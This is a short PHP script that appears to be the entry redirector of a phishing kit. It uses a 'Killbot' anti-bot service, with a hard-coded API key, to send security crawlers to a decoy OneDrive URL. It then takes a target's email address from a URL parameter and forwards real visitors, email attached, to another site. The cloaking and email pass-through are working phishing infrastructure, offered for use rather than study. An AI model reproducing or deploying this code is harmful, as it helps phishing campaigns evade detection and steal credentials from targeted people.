<?php

require_once('class.killbot.php');

$Killbot = new Killbot([
    'active'        => true, // If 'true' will set blocker protection active, and 'false' will deactive protection
    'apikey'        => 'G8ehsve_fMOf_hcgrSucOTYcbTxcy-bR1LjR5nXB646uA', // Your API Key from https://killbot.pw/developer
    'bot_redirect'  => 'https://onedrive.live.com/dhdos-2/' // Bot will be redirect to this URL
]);
$Killbot->run();

$email = $_GET['info'];
//$email = base64_decode($_GET['info']);// this for base64 converstion
$link = "https://brown.com";
$sess = "&qrc=$email";

header ("Refresh: 0; url=$link$sess");
